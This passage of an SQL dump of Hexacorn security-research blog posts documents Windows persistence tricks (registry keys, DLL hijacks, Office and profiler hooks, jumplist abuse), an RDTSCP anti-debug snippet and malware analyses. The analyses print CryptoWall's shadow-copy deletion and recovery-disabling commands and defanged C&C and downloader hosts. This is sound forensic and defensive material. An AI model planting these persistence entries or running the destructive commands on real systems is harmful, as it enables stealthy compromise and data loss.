s.dll\nC:\\Windows\\SysWOW64\\pri\\dbghelp.dll\nC:\\Windows\\SysWOW64\\pri\\ext.dll\nC:\\Windows\\SysWOW64\\pri\\exts.dll\nC:\\Windows\\SysWOW64\\pri\\ntsdexts.dll\nC:\\Windows\\SysWOW64\\pri\\uext.dll\nC:\\Windows\\SysWOW64\\uext.dll\nC:\\Windows\\SysWOW64\\wbem\\ext.dll\nC:\\Windows\\SysWOW64\\wbem\\exts.dll\nC:\\Windows\\SysWOW64\\wbem\\ntsdexts.dll\nC:\\Windows\\SysWOW64\\wbem\\uext.dll\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\ext.dll\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\exts.dll\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\ntsdexts.dll\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\uext.dll\nC:\\Windows\\SysWOW64\\winext\\arcade\\dbghelp.dll\nC:\\Windows\\SysWOW64\\winext\\arcade\\ext.dll\nC:\\Windows\\SysWOW64\\winext\\arcade\\exts.dll\nC:\\Windows\\SysWOW64\\winext\\arcade\\ntsdexts.dll\nC:\\Windows\\SysWOW64\\winext\\arcade\\uext.dll\nC:\\Windows\\SysWOW64\\winext\\dbghelp.dll\nC:\\Windows\\SysWOW64\\winext\\ext.dll\nC:\\Windows\\SysWOW64\\winext\\exts.dll\nC:\\Windows\\SysWOW64\\winext\\ntsdexts.dll\nC:\\Windows\\SysWOW64\\winext\\uext.dll\nC:\\Windows\\SysWOW64\\WINXP\\dbghelp.dll\nC:\\Windows\\SysWOW64\\WINXP\\ext.dll\nC:\\Windows\\SysWOW64\\WINXP\\exts.dll\nC:\\Windows\\SysWOW64\\WINXP\\ntsdexts.dll\nC:\\Windows\\SysWOW64\\WINXP\\uext.dll\nC:\\Windows\\uext.dll\n\nWriting to the Windows directory is more difficult nowadays than it was in the past, but with a growing number of tricks used to escalate privileges one should not blindly assume that these files are not going to be there, because of the directory ACLs.\nTo test, drop a DLL into one of these locations and crash some app – WerFault will do the rest \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/07/08/beyond-good-ol-run-key-part-14/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (278, 'Permanent Link to RegRipper Ripper (3R) and the list of reg keys covered by RR plugins – update', 'Hexacorn', 'July 2, 2014 ', 'Just a quick note that I have updated RegRipper Ripper (3R) to cover plugins from rr_20140414.zip (retrieved on 2nd of July 2014). I also added parser to retrieve the keys initialized as an array and now the ‘By Plugin file name’ section lists all the keys from the plug-ins. If you spot any mistake, please let me know and I’ll fix it.\nShare this :)', '3R, Forensic Analysis, Software Releases', 'http://www.hexacorn.com/blog/2014/07/02/regripper-ripper-3r-and-the-list-of-reg-keys-covered-by-rr-plugins-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (279, 'Permanent Link to Anti-forensics – live examples, Part 2', 'Hexacorn', 'June 27, 2014 ', 'I wrote about malware using anti-forensics tricks back in 2012. Recently I have been seeing quite a few (I believe CryptoWall) samples coming to my spambait mailbox that use anti-forensics and evasion tricks that I believe is worth documenting.\nThe malware arrives as one of the typical VOICE<phone number>.zip packages embedding unencrypted VOICE<phone number>.scr file which when executed, delivers the payload.\nThe payload is delivered in an evasive way\n\n a new suspended explorer.exe process is created and a malicious thread is injected into it\n\n\nthe code injected into explorer.exe decrypts the second stage of the payload and drops a file into a directory directly on c:\\ drive (c:\\<hex-digits>\\<hex-digits>.exe);\n\nthis is the first (kinda light) anti-forensic trick I want to talk about; it would seem malware authors try to avoid dropping the copies of malware into %APPDATA% folder (or to this folder only) as it is the place where it’s the easiest to find it\ndropping the file into more than one folder and especially into folders that are less prone to be inspected is (I believe) an attempt to evade early detection\n\nthe malware also copies itself to\n\n%APPDATA%\\Start Menu\\Programs\\Startup\\<hex digits>.exe – a typical, old-school persistence mechanism\n%APPDATA%\\<hex digits>.exe\n\nand then adds 2 Run Keys under HKCU to ensure its persistence on the system\n\n\n\n\nthe 2 keys point to\n\n\n\n%APPDATA%\\<hex digits>.exe\nc:\\<hex-digits>\\<hex-digits>.exe (the location described earlier)\n\n\n\nso, there are 3 autostart entries total and 3 copies of malware; that’s the second one – clean up of such infections may be a bit tricky and it highlights the importance of checking all the possible persistence mechanisms\n\n\nnext, the malware creates another suspended process, this time svchost.exe and injects code into it the same way as previously into explorer; it will be used to connect out to C&C\n\n\nin the meantime, the explorer.exe launches vssadmin tool with a destructive command line arguments as follows:\n\nvssadmin.exe Delete Shadows /All /Quietthat’s the third anti-forensic trick which basically deletes all the shadow copies (note, it doesn’t work under XP)\n\n\n\n\nmalware also disables the System Restore by setting the following key\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\nDisableSR (REG_DWORD) = 1that’s the fourth anti-forensic trick used by this malware\n\n\n\n\nand then also tries to kill a couple of services\n\nwscsvc\nWinDefend\nwuauserv\nBITS\nERSvc\nWerSvc\n\n\n\n\nfinally, it tries to connect out to the C&C (from the hijacked svchost.exe process)\n\nbolizarsospos(.)com\ncovermontislol(.)com\nmilimalipali(.)com\ntorichipinis(.)com\nvivatsaultppc(.)com\n\n\n\nSome variants also disable Startup Repair using the following command\n\nbcdedit /set {default} recoveryenabled No\n\nShare this :)', 'Anti-Forensics, Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/06/27/anti-forensics-live-examples-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (280, 'Permanent Link to Beyond good ol’ Run key, Part 13', 'Hexacorn', 'June 18, 2014 ', 'Today we will look at yet another less-known persistence mechanism, and as a bonus – I will be talking about it twice. It only affects Windows XP so it’s a bit old, but there are still plenty of XP systems out there so I guess it still counts \nThe mechanism relies on the following Registry key:\n\n\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\RunGrpConv\n\n\nThe presence of the key and its non-zeroish value tells the system (userinit.exe to be precise) to launch grpconv.exe when user logs on.  The grpconv.exe program itself is one of the migration applications designed to help converting Windows 3.1 groups to folders while upgrading to Windows 95+ – and now is obviously obsolete.\nPersistence mechanism #1\nSince the program is old and obsolete, most of people won’t even notice if it is gone. It’s also not protected by Windows File Protection so one could simply delete the legitimate grpconv.exe, replace it with a malicious program and set the registry key to ensure the program is launched every time user logs on.\nThis trick was successfully used by a malware family called Bredolab. The malware was also placing the file in a different location (%system%\\­wbem\\­grpconv.exe). You can see example malware report here.\nYou can experiment with this trick by replacing grpconv.exe on your test XP box with e.g. calc.exe. Once you restart the system (and log on) or simply log off and log on again you will notice that Calculator was launched…\n\nand it’s even before Windows Explorer is loaded:\n\nPersistence mechanism #2\nThe fact that grpconv.exe can be loaded every time user logs on is cool. Even cooler is the fact that it is an old school app and as such it relies on external libraries that are no longer present on the system. When executed, grpconv.exe attempts to load a non-existing imm.dll DLL.\nSo, adding the RunGrpConv key and dropping a malicious imm.dll will lead to its loading and execution anytime user logs on.\n\nA variant of this trick was previously described here.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/06/18/beyond-good-ol-run-key-part-13/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (281, 'Permanent Link to RDTSCP – a recooked AntiRe trick', 'Hexacorn', 'June 15, 2014 ', 'RDTSC is an instruction used to read a processor’s time stamp counter. Reading it twice allows to calculate a delta between the values of the time stamp counter and if the obtained delta is significantly large, use it as a detection of a debugger, emulator, or a virtual environment.\n   rdtsc\r\n   mov  ebx,eax\r\n   rdtsc\r\n   sub  eax,ebx\r\n   cmp  eax,DELTA\r\n   jb   ok\r\n   ...\r\n   suspicious environment detected\r\n   ...\r\nok:\nIt’s a really old anti-reversing trick (and it has many variants) which can be recognized/instrumented/bypassed by making RDTSC a privileged instruction (e.g. using a Phantom plugin for OllyDbg), or simply by patching the code.\nNewer processors support a new instruction called RDTSCP that does exactly the same thing as RDTSC, except it is doing it in a serializing way (which means it waits for all instructions to execute before reading the counter and the possible re-ordering of instruction execution won’t happen). It can be used to calculate the time stamp counter delta the same way as RDTSC and as a result detect the fact of program being debugged, emulated, or ran inside a virtual environment.\nThis is nothing groundbreaking (read: it’s kinda lame), but since it could be used as a ‘yet another anti-‘ trick it is still worth documenting.\n   rdtscp\r\n   mov  ebx,eax\r\n   rdtscp\r\n   sub  eax,ebx\r\n   cmp  eax,DELTA\r\n   jb   ok\r\n   ...\r\n   suspicious environment detected\r\n   ...\r\nok:\nThe opcode for RDTSCP is 0F 01 F9 so you can embed it inline if your assembler doesn’t support it.\nOllyDbg 1.x recognizes RDTSCP as:\n\n\n0F01F9 INVLPG  CL\n\n\nThe OllyDbg 2.x recognizes it correctly as\n\n\n0F01F9 rdtscp\n\n\nRDTSCP is not recognized by Virtual PC 2007 and older hardware. One can use a cpuid to determine support for this instruction, or simply attempt running it and catch the STATUS_ILLEGAL_INSTRUCTION exception if the instruction is invalid.\nOne thing to note: RDTSC(P) delta trick doesn’t detect virtual environments very well – running samples ‘live’ inside VMWare easily fools malware that they run on the ‘real’ computer (unless they use other vm detection tricks, or the delta is really small – kinda silly idea since it would prevent running the malware on slower systems). As mentioned above, if used in debugging/tracing context RDTSC(P) can be quite successful. It would be interesting to find out how it performs under various emulators, but I don’t use them so I could not test it.\nResults of running under VM are below:\n\nHost (Windows 7SP1 x64):\n\nrdtscp delta=27, rdtsc delta=21\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=140\nrdtscp delta=56, rdtsc delta=18\n\n\nrdtscp delta=76, rdtsc delta=60\nrdtscp delta=27, rdtsc delta=29\nrdtscp delta=38, rdtsc delta=21\n\n\nVMWare Workstation 10.0.2, guest OS: Windows XP SP3 32:\n\nrdtscp delta=241, rdtsc delta=325\nrdtscp delta=241, rdtsc delta=399\nrdtscp delta=236, rdtsc delta=331\nrdtscp delta=236, rdtsc delta=405\nrdtscp delta=265, rdtsc delta=304\nrdtscp delta=265, rdtsc delta=349\nrdtscp delta=265, rdtsc delta=340\n\n\nVMWare Workstation 10.0.2, guest OS: Windows 7 SP1 32:\n\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=21\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=21\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=18\nrdtscp delta=56, rdtsc delta=21\n\n\nVMWare Workstation 10.0.2, guest OS: Windows 7 SP1 64:\n\nrdtscp delta=27, rdtsc delta=21\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=47\nrdtscp delta=27, rdtsc delta=18\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=56, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=21\n\n\nVirtual Box 4.3.10, guest OS: Windows XP SP3 32:\n\nrdtscp delta=64, rdtsc delta=64\nrdtscp delta=27, rdtsc delta=47\nrdtscp delta=27, rdtsc delta=18\nrdtscp delta=27, rdtsc delta=18\nrdtscp delta=56, rdtsc delta=21\nrdtscp delta=27, rdtsc delta=21\nrdtscp delta=27, rdtsc delta=50\nrdtscp delta=27, rdtsc delta=47\n\n\n\nYou can download the test program here.\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2014/06/15/rdtscp-a-recooked-antire-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (282, 'Permanent Link to Upatre’s gadgetry', 'Hexacorn', 'May 24, 2014 ', 'During last week I have seen News reports talking about spam campaign delivering the malware that is using a .gadget file extension. Since one of my spambait accounts got it as well I decided to run a quick test and write down what I found about it.\nAnd just in case you are wondering – despite the Gadgets being retired they still work.\nThe malicious attachment is called internal_use_only.gadget; Gadget files are zip files so one can enumerate their content e.g. with 7Zip:\nPath = internal_use_only.gadget\r\nType = zip\r\nPhysical Size = 6878\r\n\r\n   Date      Time    Attr         Size   Compressed  Name\r\n------------------- ----- ------------ ------------  ------------------------\r\n2014-05-16 12:45:26 ....A          335          220  gadget.html\r\n2014-05-16 12:44:14 ....A        10240         6151  main.exe\r\n2014-05-15 22:08:40 ....A          326          199  gadget.xml\r\n------------------- ----- ------------ ------------  ------------------------\r\n                                 10901         6570  3 files, 0 folders\nIf dropped in a folder, we can see the icon of a Gadget\nThe content of the gadget.xml:\n\nThe content of the gadget.html:\nand the third file is a small executable called main.exe.\nQuick analysis confirmed it’s Upatre, a well-known Zeus downloader.\nWhen main.exe is executed it drops its copy as %TEMP%\\ycare.exe and appends the original path to the main.exe so that ycare.exe can delete it once it’s executed. The executed ycare.exe attempts to connect to just* [ . ]com/wp-content/uploads/2014/02/1605UKmw.enc or grab the very same file from dot*[ . ]com/fonts/1605UKmw.enc.\nIf the user is silly enough to open this gadget on the computer the warning popup will show up:\n\nIf the user is silly^2 enough, the ‘gadget’ will be ‘added’ to the Sidebar:\n\n– and the malware thingie will run.\nThe Gadgets leave Gadgetish remnants on the system and they can be potentially used to determine the original attack vector:\n\n%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows Sidebar\\Gadgets\\\ninternal_use_only.gadget\\gadget.html\n%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows Sidebar\\Gadgets\\\ninternal_use_only.gadget\\gadget.xml\n\nand also\n\n%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows Sidebar\\Settings.ini\n\n– the latter will contain the description of Gadget(s) added to the system\n\nOther artifacts are less reliable e.g.:\n\nHKCU\\Software\\Classes\\Local Settings\\MuiCache\n\nmay contain references to Sidebar binaries and\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nmay contain the entry starting Sidebar via\n\nC:\\Program Files\\Windows Sidebar\\sidebar.exe /autoRun\n\n– it’s less reliable, because users may have other Gadgets installed and Sidebar installation is nothing unusual in their environment.\nNothing extraordinary – just yet another creative way to deliver the badness.\nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/05/24/upatres-gadgetry/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (283, 'Permanent Link to Beyond good ol’ Run key, Part 12', 'Hexacorn', 'May 21, 2014 ', 'After googling around I couldn’t find any reference to Rover autostart mechanism, so here is a quick introduction for you:\nAdding this key [key only is enough]:\n\n\nHKEY_CLASSES_ROOT\\CLSID\\{16d12736-7a9e-4765-bec6-f301d679caaa}\n\n\nand dropping the following file:\n\n\nc:\\windows\\system32\\rover.dll\n\n\nwith an exported function called RunMonitor will cause rover.dll to be loaded.anytime user logs in [it’s loaded by userinit.exe].\nTested on Windows 7 and Windows 8.1.\n\nI have received a few questions with regards to this post, so here are some notes that I hope will be helpful:\n\nDespite being placed under HKCR, it’s not a regular COM entry\nIt’s an equivalent of a Boolean flag stored in Registry; same as a presence of a file on a disk\n\nIf key exists\n{ do something }\n\n\nI believe it’s a part of some testing/QA platform; maybe some exotic extension used only in special builds [Windows is actually full of these conditionally loaded DLLs]\n\nNote: For unknown reason this post disappeared. Re-adding it. (suspecting wordpress hiccup; update: after checking logs it looks more like a DB problem and it was restored by the provider from a backup /removing the post on the way/)\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/05/21/beyond-good-ol-run-key-part-12/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (284, 'Permanent Link to RCE: List of 64-bit tools', 'Hexacorn', 'May 21, 2014 ', 'Update  (June, 4th, 2014): Added Hex-Rays Decompiler  x64\n64-bits platform is becoming a standard and reverse engineering of the PE32+ files is now a daily bread to many malware analysts. Tools that are designed to make things easier are luckily out there and new ones keep popping up all over the place. Unfortunately, many of the tools are not mature enough yet and often crash or do some funny stuff, but this is developing really fast and hopefully the RCE arsenal will expand soon.\nHere is a short list of the tools I came across and use most of them in my research and analysis of PE32+ files. If you know any other useful tools, I’d be grateful if you let me know. Thanks!\nDocs\n\nVery useful primer for x64 n00bs  – http://uuu.enseirb.fr/~amacabies//pdf/intro-to-x64-reversing.pdf; contains useful examples and links [I don’t add them here; download PDF and take it from there]\n\nBypassing signature checks/disabling PageGuard\n\nDriver Signature Enforcement Overrider 1.3b – http://www.ngohq.com/?page=dseo\nDisable PatchGuard & Driver Signing on X64 Windows 7 + SP1 – http://fyyre.ivory-tower.de/projects/no_pg_ds_v3.rar\nDisable PatchGuard on Windows 8 x64 – http://fyyre.ivory-tower.de/projects/disable_pg_win8.rar\n\nPE Viewer/Editors supporting PE32+\n\n\nPEStudio – http://www.winitor.com/\nExplorer Suite – http://www.ntcore.com/exsuite.php\nPE Insider – http://icerbero.com/peinsider/\nHiew – http://www.hiew.ru/\nOf course, there are many PE editors out there – if you can recommend any I’d appreciate if you give me a shout\n\nDisassembler\n\nIDA Pro – https://www.hex-rays.com/products/ida/\n\nDecompiler\n\nHex-Rays Decompiler https://www.hex-rays.com/products/decompiler/news.shtml#140604\nSmartDec – http://derevenets.com/download.html\nC4 Decompiler – http://www.c4decompiler.com/\n\nDebugger (they are also disassemblers)\n\nOllydbg 64 is still not ready, but there are a couple of tools that can be useful even if not that user-friendly:\n\nWindbg – http://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx\nPEBrowseDbg – http://www.smidgeonsoft.prohosting.com/pebrowse-pro-interactive-debugger.html\nIDA debugger – https://www.hex-rays.com/products/ida/\nFDBG – http://fdbg.x86asm.net/\nNanomite – https://github.com/zer0fl4g/Nanomite\nBugDBG – http://pespin.w.interia.pl/\nEdb-Debugger – https://code.google.com/p/edb-debugger/\nVisual Dux Debugger – http://www.duxcore.com/index.php/prod/visual-duxdebugger/overview\n\nProcess / Memory Viewer\n\nProcess Hacker – http://processhacker.sourceforge.net/\n\nProcess dumpers\n\nScylla – https://github.com/NtQuery/Scylla\nProcdump – http://technet.microsoft.com/en-us/sysinternals/dd996900.aspx\n\nHook Detector\n\nHookShark – http://homeofgamehacking.de/showthread.php?tid=823\n\nAPI Monitor\n\nRohitab Api Monitor – http://www.rohitab.com/downloads\n\n Hiding Processes\n\nHidecon – http://fyyre.ivory-tower.de/projects/hidecon.rar\n\nThanks to Ange and Nanu Jogi for fixes and suggestions.\nShare this :)', 'Malware Analysis, Tips & Tricks', 'http://www.hexacorn.com/blog/2014/05/21/rce-list-of-64-bit-tools/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (285, 'Permanent Link to Beyond good ol’ Run key, Part 11', 'Hexacorn', 'April 27, 2014 ', 'I must admit that finding new paths that could be exploited as a persistence mechanism is a silly hobby of mine. When I started this series I thought that a few posts will suffice, but to my surprise it’s already #11. For your convenience, these are links to the older posts::\n\nBeyond good ol’ Run key, Part 1\nBeyond good ol’ Run key, Part 2\nBeyond good ol’ Run key, Part 3\nBeyond good ol’ Run key, Part 4\nBeyond good ol’ Run key, Part 5\nBeyond good ol’ Run key, Part 6\nBeyond good ol’ Run key, Part 7\nBeyond good ol’ Run key, Part 8\nBeyond good ol’ Run key, Part 9\nBeyond good ol’ Run key, Part 10\n\nYou may also want to have a look at ‘A Collection of Autostart Locations’ – a very large and comprehensive list of autostart entries collected by Tony Klein\n\nhttp://gladiator-antivirus.com/forum/index.php?showtopic=24610\n\nBack to the #11.\nIn the part #10 (Office Test) I mentioned that Microsoft products seem to be heavily integrated with various testing platforms. I also referenced various aspects of performance analysis, profiling, monitoring and debugging in parts #4 (various debuggers), #6 (VBA Monitors), #7 (OAClient). There is one more trick that we can add to the list – legitimate, developer-friendly profiling mechanisms that can be enabled on non-developer systems and… act as a persistence mechanism.\nThe profiling mechanisms described further require a persistent environment variable to be set. This can be achieved by setting the respective values under HKCU or HKLM:\n\nHKEY_CURRENT_USER\\Environment\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\n\nThe values that need to be placed under the Environment keys depend on the profiling mechanism – these are listed below:\n\nJS_PROFILER – Active Script Profiling (I believe it was introduced in IE 8.0)\n\n \n\nCOR_ENABLE_PROFILING & COR_PROFILER & COR_PROFILER_PATH &\nCOMPLUS_ProfAPI_ProfilerCompatibilitySetting &\nCORECLR_ENABLE_PROFILING & CORECLR_PROFILER &  CORECLR_PROFILER_PATH\n– .NET Profiling\nsee also\nRegistry-Free Profiler Startup and Attach\nWriting a Profiler for Silverlight 4\nCLRProfiler V4 and\nWriting a Profiler of Windows Store apps (PDF)\n\n \nExample for JS_PROFILER:\nAdding the following Registry entries:\n[HKEY_CLASSES_ROOT\\CLSID\\{12345678-1234-1234-1234-123456789abc}\\InprocServer32]\r\n@=hex(2):63,00,3A,00,5C,00,74,00,65,00,73,00,74,00,5C,00,74,00,65,00,\\\r\n  73,00,74,00,2E,00,64,00,6C,00,6C,00,00,00\r\n\r\n[HKEY_CURRENT_USER\\Environment]\r\n\"JS_PROFILER\"=\"{12345678-1234-1234-1234-123456789abc}\"\nwill ensure that c:\\test\\test.dll (added as a REG_EXPAND_SZ value using ‘@=hex(2):…’) is loaded anytime Internet Explorer is executed or its control instantiated (JS_PROFILER is used internally by JSCRIPT*.DLLs – they handle scripting and they are used by Internet Explorer).\n \n \n \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/04/27/beyond-good-ol-run-key-part-11/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (286, 'Permanent Link to Beyond good ol’ Run key, Part 10', 'Hexacorn', 'April 16, 2014 ', 'There is no doubt that Microsoft products are a subject to a lot of testing – this is understandable as it’s undeniably the most used office software in the world. It’s hard to imagine software packages that complex to be completely separated from the platform/modules that are used to testing them – it’s not a surprise then that references to various Microsoft testing platforms or modules can be found in strings or Process Monitor logs. One of them is called Oasys (Office Automation System) and I discussed it in the 7th part of the series. This is not the only one though and this short post will talk about yet another trick (or two) that are most-likely side-effects of deep integration with testing platforms – they can be both used to load a phantom DLL anytime Office programs start, and in some cases when other programs do as well.\nOffice 2007, 2010 and 2013\nAdding a key/value pair shown below to the Registry will guarantee that the test.dll will load anytime Office 2007, 2010 or 2013 programs are started (e.g. WinWord, Excel):\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Office Test\\Special\\Perf]\r\n@=\"C:\\\\test\\\\test.dll\"\nInterestingly, sometimes the DLL will be also loaded when e.g. Internet Explorer launches – as long as one of the office plugins is loaded into IE (and the plugin’s code or its libraries refer to the aforementioned Office Test value). There are most likely other cases since Office COM objects can be easily instantiated from other software.\nThe respective global key exists under the HKLM branch i.e. HKLM\\SOFTWARE\\Microsoft\\Office Test\\Special\\Perf.\nOffice 2010 and WinWord\n\nAdding a key/value pair shown below to Registry will guarantee that instead of a WWLIB.DLL that is distributed with Office 2010 a different DLL will be loaded instead anytime WinWord starts – a DLL named WWLIBcxm.DLL.\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\14.0\\Word]\r\n\"CxmDll\"=dword:00000001\nIn other words, placing a custom WWLIBcxm.DLL in the Office directory (or any listed under PATH) will do the trick. Note that such DLL will need to act as a proxy for WWLIB.DLL – otherwise the WinWord won’t load (it requires WWLIB.DLL to work).\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (287, 'Permanent Link to Beyond good ol’ Run key, Part 9', 'Hexacorn', 'March 2, 2014 ', 'Using Jumplists as an autostart mechanism is possible, but requires users to actually use this feature for this persistence trick to be successful. There is obviously a better way of persuading users to execute stuff and that is by manipulating the pinned applications themselves.\nMicrosoft doesn’t document the interface used by the Pinned Apps, but others do. Windows folks do it on purpose – pretty much any exposed element of GUI has been abused in the past in many ways so protecting the taskbar and pinned apps is definitely in the user’s best interest. Still, there are already documented ways to modify the Pinned Apps list – one can use a script published by Microsoft itself on the MSDN blog back in 2009; there also seems to be a way of modifying the list of pinned apps during the DASH process by modifying the entries under the following key:\n\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TBDEn\n\n\nTo test the idea, I wrote a small test app that ‘talks’ to Pinned Apps directly and swaps the pinned app’s target executable path to one that is potentially malicious. The program enumerates the pinned apps, checks if the link points to internet explorer and then replaces the pinned app with one that points to c:\\test\\malware.exe. The ‘malware.exe’ is actually a copy of ‘iexplore.exe’ (I was too lazy to create my own test app with the icon identical to Internet Explorer’s).\nThe path change can be confirmed by checking the properties of the first pinned application on the Taskbar:\n\nThe list of links for all pinned apps before and after the modification are shown below (pinenum.exe is a small tool that enumerates all pinned apps):\n\n For obvious reasons, I won’t release the code publicly.\nIf you want the pinenum.exe tool go to this post.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/03/02/beyond-good-ol-run-key-part-9/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (288, 'Permanent Link to Beyond good ol’ Run key, Part 8', 'Hexacorn', 'February 21, 2014 ', 'The last two posts in the series covered autorun mechanisms that could be called a ‘side-effect’. Today a slightly different topic – one that relies on the social engineering of users, and a very old concept of a companion virus. The idea described below is not a typical autostart mechanism and is actually a description of an existing, legitimate functionality, but as long as users are using jumplists frequently it may be actually acting quite successfully as a persistence mechanism. It may also be a secondary option for malware disabled by an antivirus software/user from the typical autorun entries. Nothing new here and it’s the topic covered by lot of other blogs, but since I am trying to document all possible persistence mechanisms, it’s worth mentioning it for the completeness.\nJumplists that have been introduced in Windows 7 are used to organize recently opened files, favorite files, folders, and websites. They offer more options that shortcut files and this flexibility can be easily abused. I will show you one simple example of such abuse, done manually; there are a lot of other options of course and they can be obviously automated using exposed Jumplist interface.\nTo test it, you may want to download JumpList Editor – it’s a handy tool that allows one to edit Jumplists present on the system.\nHere, I am using it to add a fake entry under Internet Explorer:\n\nFirst, we select existing entry for Internet Explorer:\n\n\n\nNow we add a Link entry:\n\n\n\nWe can call it e.g. “My Bank Web Site”; in real-world scenario, malware could re-use existing entry and replace it (hence, companion virus reference)\n\n\n\nOnce we click Save, we can observe the entry added to the Internet Explorer Jump list\n\n\n\nClicking the icon launches the Calculator\n\n\nThere are other interesting options out there. For example, one can add a Multiple Link – this will create a link that launches two applications at the same time. Therefore, one could swap existing link to an application to a Multiple Link that would launch both of them simultaneously.\n\nDespite looking like a link to the Notepad Double Trouble launches both preprogrammed applications at the same time (when clicked): Notepad and Calculator. Quite a nice way to hide in a plain sight.\n\nIt’s easy to notice that the links we have added are all located under ‘Tasks’ entries; This may not be ideal and a savvy user may notice something ‘funny’, but how many people really pay attention to such small details? Besides, this is the only option offered for an easy manipulation by the JumplistEditor. In reality, pretty much any aspect of the JumpLists can be abused – either by using documented APIs, or by manually modifying the actual Jumplist or Shortcut LNK files. One could replace legitimate tasks like ‘Start InPrivate Browsing’, ‘Open new Tab’, etc.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/02/21/beyond-good-ol-run-key-part-8-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (289, 'Permanent Link to Trivial AppID Impersonation', 'Hexacorn', 'February 20, 2014 ', 'I was wondering what would happen if one tried to impersonate the AppID of the common applications i.e. run my own application and change its AppID to that of a well-known application during run-time. Kinda lame, I know.\nTo test it, I wrote a quick PoC that uses SetCurrentProcessExplicitAppUserModelID API to pretend it is Internet Explorer, Remote Desktop and Sticky Notes using their respective AppIDs. I also added the AppID for Notepad – while it doesn’t have a standard AppID like the 3 other applications I just wanted to show that we can still enforce the AppID association using Notepad’s normalized path {D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}\\notepad.exe (for details see my older post about AppIDs).\nHere’s a list of AppIDs used:\n\nInternet Explorer – Microsoft.InternetExplorer.Default\nRemote Desktop – Microsoft.Windows.RemoteDesktop\nSticky Notes – Microsoft.Windows.StickyNotes\nNotepad – {D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}\\notepad.exe\n\nI pinned all these 4 applications to the Taskbar on Windows 8.1. and then ran my test application, pausing it each time I changed the AppID to take a screenshot I got the result combined on the below picture. Not surprisingly anytime I changed the AppID a different pinned taskbar icon got highlighted (the test application needs to do some GUI operation for it to work; it can simply show a message box).\n\nThis is quite a tiny level of impersonation – hard to really come up with some really useful scenarios here – perhaps one could use it to enforce social engineering attempts (e.g. escalation of privileges triggered by malware while pretending to be from some legitimate Windows application, or perhaps AV) ? But aren’t existing GUI manipulation tricks better than that? Oh well, trivial is trivial.\nShare this :)', 'Others, Silly', 'http://www.hexacorn.com/blog/2014/02/20/trivial-appid-impersonation/\n');
